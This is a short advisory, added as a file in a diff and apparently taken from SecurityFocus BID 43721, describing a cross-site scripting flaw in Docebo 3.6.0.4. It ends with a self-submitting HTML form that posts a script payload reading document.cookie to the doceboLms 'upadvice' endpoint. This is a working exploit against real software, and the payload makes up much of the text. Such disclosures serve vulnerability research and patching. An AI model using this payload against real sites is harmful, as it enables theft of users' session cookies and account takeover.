@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/43721/info
+
+Docebo is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Docebo 3.6.0.4 is vulnerable; prior versions may also be affected.
+
+<form action="http://www.example.com/doceboLms/index.php?modname=advice&op=upadvice" method="post" name="main" > <input type="hidden" name="idAdvice" value="2" /> <input type="hidden" name="title" value="Hello" /> <input type="hidden" name="description" value='1"><script>alert(document.cookie)</script>' /> <input type="hidden" name="addadvice" value="Save changes" /> </form> <script> document.main.submit(); </script> 
